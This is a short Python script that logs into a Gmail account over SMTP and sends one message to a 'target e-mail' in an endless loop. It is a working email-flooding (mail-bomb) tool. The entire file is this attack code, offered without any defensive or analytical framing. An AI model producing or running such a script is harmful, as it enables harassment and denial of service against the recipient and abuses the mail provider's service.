import smtplib, getpass

email = input("email>")
pwd = getpass.getpass("pwd>")

#connection to gmail
o = smtplib.SMTP("smtp.gmail.com:587")
o.starttls()
o.login(email, pwd)

print("--" * 40)

msg = (input("msg>"))
target_email = input("target e-mail>")

#send the message until the program crashes
while True:
    o.sendmail(email, target_email, msg)
    print()
    print("Message sent.")



